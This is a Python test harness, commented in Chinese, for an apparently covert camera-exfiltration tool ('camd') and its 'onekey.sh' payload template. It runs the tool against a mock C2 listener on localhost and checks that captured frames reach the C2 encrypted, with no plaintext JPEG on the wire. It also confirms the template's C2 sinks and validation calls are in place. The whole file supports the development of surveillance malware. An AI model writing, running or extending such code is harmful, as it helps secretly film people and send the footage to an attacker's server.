#!/usr/bin/env python3
"""摄像头链路回传 —— 正向 + 反向守卫。

正向(F1/F2)：camd 用 tcp:// 前缀的 sink，C2 真实收到字节、线上不含明文。
反向(R1)：   去掉 tcp:// 前缀（缺陷形态），C2 收 0 字节、且本地生成
             名为"地址:端口"的文件 —— 证明该前缀是回传能否成立的唯一分界。
静态(S1)：   onekey.sh 模板里三处 sink 必须显式带 tcp:// 前缀。

R1 的存在意义：若没有它，仅凭"C2 收到字节"这个正向断言，在 sink 被误写成
文件路径时同样可能凑巧成立（例如 cwd 恰好可写）——那时守卫会假绿。
"""
import os, socket, subprocess, sys, time, threading, hashlib, glob

CAMD_SRC = "/data/workspace/dayanjing/agent_windows/build/linux/camd"
CAMD = "/usr/local/bin/camd"
TEMPLATE = "/data/workspace/dayanjing/21_exfil/onekey.sh"

received = {"n": 0, "buf": b"", "conn": 0}
fails = []


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def server(port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", port))
    s.listen(8)
    while True:
        try:
            c, _ = s.accept()
        except OSError:
            return
        received["conn"] += 1
        while True:
            try:
                d = c.recv(65536)
            except OSError:
                break
            if not d:
                break
            received["n"] += len(d)
            received["buf"] += d
        c.close()


def reset():
    received["n"] = 0
    received["buf"] = b""
    received["conn"] = 0


def run(cmd, timeout=90):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired as e:
        return -9, (e.stdout or ""), (e.stderr or "")


def check(cond, name, detail=""):
    if cond:
        print(f"[PASS] {name}" + (f"  {detail}" if detail else ""))
    else:
        print(f"[FAIL] {name}  {detail}")
        fails.append(name)


def clear_strays(port):
    for pat in (f"/tmp/127.0.0.1:{port}", f"/data/workspace/127.0.0.1:{port}"):
        if os.path.exists(pat):
            os.remove(pat)


def main():
    if not os.path.exists(CAMD):
        shutil_ok = run(f"cp {CAMD_SRC} {CAMD} && chmod 755 {CAMD}")
        if shutil_ok[0] != 0:
            print("[FATAL] camd 不可用"); sys.exit(2)

    key = hashlib.sha256(os.urandom(32)).hexdigest()[:64]
    cwd = "/data/workspace"

    # ---------- F1: tcp:// + C2 在线 ----------
    port = free_port()
    threading.Thread(target=server, args=(port,), daemon=True).start()
    time.sleep(0.5)
    reset()
    clear_strays(port)
    rc, out, _ = run(f"cd {cwd} && {CAMD} --sink tcp://127.0.0.1:{port} "
                     f"--backend mock --key {key} --batches 1 --frames 1 2>&1")
    time.sleep(1.0)
    magic = b"\xff\xd8\xff"
    check(rc == 0 and received["n"] > 0, "F1 tcp:// 前缀时 C2 真实收到字节",
          f"rc={rc} 连接={received['conn']} 实收={received['n']}")
    check(received["n"] > 0 and magic not in received["buf"],
          "F2 线上信元不含 JPEG 明文",
          f"字节值种类={len(set(received['buf']))}")

    # ---------- R1: 去掉 tcp:// 前缀（缺陷形态）----------
    port2 = free_port()   # 故意不监听
    reset()
    clear_strays(port2)
    rc2, out2, _ = run(f"cd {cwd} && {CAMD} --sink 127.0.0.1:{port2} "
                       f"--backend mock --key {key} --batches 1 --frames 1 2>&1")
    time.sleep(0.5)
    stray = [p for p in (f"{cwd}/127.0.0.1:{port2}", f"/tmp/127.0.0.1:{port2}")
             if os.path.exists(p)]
    check(received["n"] == 0, "R1 缺 tcp:// 前缀时 C2 实收 0 字节（回传断裂）",
          f"rc={rc2} 实收={received['n']}")
    check(bool(stray), "R2 缺前缀时数据落到名为'地址:端口'的文件（缺陷指纹）",
          f"stray={stray[:1]}")
    check(rc2 == 0, "R3 缺前缀时 camd 仍返回 0（故障被静默掩盖）", f"rc={rc2}")
    for p in stray:
        os.remove(p)

    # ---------- S1: 模板静态守卫 ----------
    s = open(TEMPLATE).read()
    # 注意：# PAYLOAD_BEGIN 在注释里也被提及过，按它切分会把正文切掉。
    # 直接对全文计数：注释中出现的写法是 `--sink $C2_ADDR`（tcp://）`，
    # 不含 "--sink tcp://" 或 '--sink "tcp://' 连续串，不会误计。
    n_pref = s.count('--sink tcp://') + s.count('--sink "tcp://')
    check(n_pref >= 3, "S1 模板三处 sink 均显式带 tcp:// 前缀", f"计数={n_pref}")
    # 必须查"调用点"而非"定义存在"：只删调用行时函数定义仍在，
    # 若判据是 `"validate_c2" in s` 会继续绿 —— 校验形同虚设却无人察觉。
    check("\n    validate_c2\n" in s,
          "S2 模板的 C2 校验被真正调用（非仅定义）")

    print("=" * 60)
    if fails:
        print(f"[FAIL] {len(fails)} 项未通过: {fails}")
        sys.exit(1)
    print("[PASS] 全部通过  EXIT=0")


if __name__ == "__main__":
    main()
